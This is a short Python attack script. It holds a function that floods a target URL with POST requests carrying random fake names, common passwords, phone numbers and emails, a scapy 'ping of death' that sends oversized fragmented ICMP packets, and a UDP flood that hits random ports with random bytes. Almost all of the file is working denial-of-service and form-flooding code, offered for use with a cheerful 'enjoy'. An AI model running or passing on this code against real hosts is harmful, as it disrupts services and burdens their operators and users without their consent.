import time
import requests
import random
import socket

from scapy.all import fragment, send, IP, ICMP


from random_data import (
    random__common_password,
    random_email,
    random_name,
    random_phone_number,
)


def fake_data(ip_target, username=False, password=False, phone=False, email=False):
    """Make a request POST with random info selected

    Args:
        ip_target (str): IP direction of the target
        username (bool, optional): Added a random name in petition. Defaults to False.
        password (bool, optional): Added a random password in petition. Defaults to False.
        phone (bool, optional): Added a random phone number in petition of conutry selected. Defaults to False.
        email (bool, optional): Added a random email in petition. Defaults to False.

    Returns:
        str: The data of the petition wanted
    """
    credentials = {}
    # credentials.update({"ip_target": ip_target})
    if username:
        username = random_name()
        credentials.update({"username": username})
    if password:
        password = random__common_password()
        credentials.update({"password": password})
    if phone:
        phone = random_phone_number()
        credentials.update({"phone": phone})
    if email:
        email = random_email(username)
        credentials.update({"email": email})
    test = requests.post(ip_target, allow_redirects=False, data=credentials)
    print(test)
    return credentials


def ping_of_death(time_selected, ip_target):
    """A clasic ping of death with scapy, enjoy

    Args:
        time_selected (int): duration in seconds of the test
        ip_target (str): IP direction of the target
    """
    timeout = time.time() + 1 * int(str(time_selected))
    while time.time() < timeout:
        send(fragment(IP(dst=ip_target) / ICMP() / ("X" * 60000)), verbose=0)


def attack_flood_udp(time_selected, ip_target):
    """A flood UDP test to a target selected in a determinated duartion

    Args:
        time_selected (int): The duration of the test
        ip_target (str): IP direction of the target
    """
    try:
        timeout = time.time() + 1 * int(str(time_selected))
        bytes = random._urandom(1024)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < timeout:
            dport = random.randint(20, 55500)
            sock.sendto(bytes * random.randint(5, 15), (ip_target, dport))
    except:
        print("Can't perform the atack, passing")
        pass
